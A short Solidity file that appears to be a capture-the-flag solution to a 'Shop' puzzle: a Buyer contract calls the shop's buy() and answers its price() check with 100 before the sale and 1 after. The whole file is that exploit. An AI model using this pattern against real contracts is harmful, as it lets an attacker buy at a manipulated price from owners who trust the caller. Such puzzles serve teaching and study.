// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Buyer {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns (uint) {
        return shop.isSold() ? 1 : 100;
    }
}

interface Shop {
    function isSold() external view returns (bool);
    function buy() external;
}
